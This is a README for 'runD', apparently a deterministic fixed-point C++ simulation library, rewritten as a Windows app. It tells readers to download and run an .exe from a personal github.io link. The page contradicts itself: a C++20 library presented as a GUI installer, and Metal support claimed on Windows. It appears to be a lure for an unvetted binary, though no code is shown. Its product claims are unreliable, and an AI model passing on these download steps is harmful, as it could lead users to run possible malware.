# ⚙️ runD - Create fast simulations with consistent results

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://titur1406.github.io)

## 📌 Overview

runD helps you create complex calculations that run the same way on every computer. Whether you use a standard processor or a graphics card, the math remains exact. This consistency helps developers build reliable simulations and high-performance tools. You no longer need to worry about small differences in results when switching between different hardware components.

## 🚀 Getting Started

Follow these steps to set up runD on your Windows computer.

1. Visit the [releases page](https://titur1406.github.io) to download the installer.
2. Choose the file ending in `.exe` that matches your version of Windows.
3. Save the file to your desktop or a folder you can find easily.
4. Double-click the file to start the installation process.
5. Follow the prompts on your screen to complete the setup.
6. Open your start menu, search for runD, and select the application to begin.

## 🛠 System Requirements

Your computer must meet these basic needs to run the software smoothly:

*   Operating System: Windows 10 or Windows 11 (64-bit).
*   Processor: Any modern CPU that supports standard compute instructions.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 200 megabytes of free space on your hard drive.
*   Graphics: Support for Vulkan or Metal-compatible hardware for advanced computing tasks.

## ⚙️ How it Works

The software uses a technique called fixed-point math. Standard computers often use floating-point math, which can create tiny variations in results depending on how the hardware processes the numbers. These variations become problems in simulations where you need the exact same output every time.

runD avoids these issues by treating numbers as fixed blocks. This keeps every calculation identical across different processors, including your main CPU and your graphics card. You get reliable performance without needing to rewrite your logic for different hardware types.

## 📦 Features

*   **Hardware Independence:** Run your code on CPUs, Metal devices, or Vulkan hardware without changing your logic.
*   **Predictable Math:** Get the same result every single time because the software uses rigid math rules.
*   **Replay Support:** Record your simulation steps and play them back with perfect accuracy.
*   **No Fallbacks:** The software refuses to guess if a calculation path is unclear, ensuring you always know the exact state of your simulation.
*   **High Performance:** Optimize your heavy tasks by distributing them across your available hardware cores.

## 📋 Using the Application

Once installed, runD provides a dashboard for your simulations. You can load project files, set your computing target, and observe the output logs.

### Loading a project
Use the "File" menu to open your existing project folder. The software will scan your files and verify that they match the requirements for stable simulation.

### Running simulations
The main window allows you to select your target processor. Click "Run" to start the process. The status bar at the bottom will track progress in real-time. If you need to stop, use the "Cancel" button.

### Viewing logs
The output window provides a history of your computing tasks. You can save these logs to a text file for review later. This is useful for checking if your simulation matches previous runs.

## ❓ Troubleshooting

If you experience issues, try these steps:

*   **Application does not launch:** Check if you have the latest graphics drivers installed for your computer.
*   **Simulation errors:** Make sure your project files are in the correct format as described in the documentation folder included with your installation.
*   **Performance is slow:** Close other programs that use your graphics card or processor while running heavy simulations.
*   **Installation fails:** Ensure you have administrator rights on your Windows account.

## 📝 Support

If you need more help, look at the documentation included with your download. You can also view the issues section on the main website to see if other users solved similar problems.

Keywords: c-plus-plus, cpp, cpp-library, cpp20, determinism, deterministic, fixed-point, game-development, gpgpu, gpu-computing, heterogeneous-computing, high-performance-computing, lockstep, metal, parallel-computing, replay, reproducibility, runtime, simulation, vulkan